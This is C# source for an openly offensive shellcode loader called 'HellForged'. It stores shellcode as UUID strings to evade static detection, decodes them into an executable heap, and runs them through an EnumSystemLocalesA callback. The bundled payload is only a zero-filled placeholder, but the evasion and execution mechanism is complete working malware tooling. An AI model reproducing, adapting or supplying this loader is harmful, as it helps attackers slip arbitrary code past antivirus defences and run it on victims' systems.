using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace HellForged
{
    class Program
    {
        // HellForged - UUID Shellcode Loader (Obfuscation)
        // Transforms shellcode into UUID strings to bypass static analysis of byte arrays.
        
        [DllImport("kernel32.dll")]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll")]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("Rpcrt4.dll")]
        static extern int UuidFromStringA(string StringUuid, IntPtr Uuid);

        [DllImport("kernel32.dll")]
        static extern bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, uint dwFlags);

        static void Main(string[] args)
        {
            Console.WriteLine("[*] HellForged - UUID Shellcode Loader");

            // Example Shellcode (Calculator - x64) as UUIDs
            // In a real scenario, you'd convert your raw shellcode to this format.
            // This is just a dummy payload for PoC.
            string[] uuids = {
                "00000000-0000-0000-0000-000000000000", // Placeholder
                // Real shellcode would look like: "E48348FC-E8C0-0000-0000-415141505251"
            };

            Console.WriteLine($"[*] Loading {uuids.Length} UUID chunks...");

            IntPtr hHeap = HeapCreate(0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            IntPtr pBase = HeapAlloc(hHeap, 0, (UIntPtr)(uuids.Length * 16));

            IntPtr pCurrent = pBase;
            foreach (var uuid in uuids)
            {
                // Convert string UUID back to bytes in memory
                UuidFromStringA(uuid, pCurrent);
                pCurrent = IntPtr.Add(pCurrent, 16);
            }

            Console.WriteLine("[*] Payload De-obfuscated in Memory.");
            Console.WriteLine("[*] Triggering Execution via Callback...");

            // Callback execution for evasion (EnumSystemLocalesA)
            EnumSystemLocalesA(pBase, 0);

            Console.WriteLine("[+] Execution finished.");
        }
    }
}
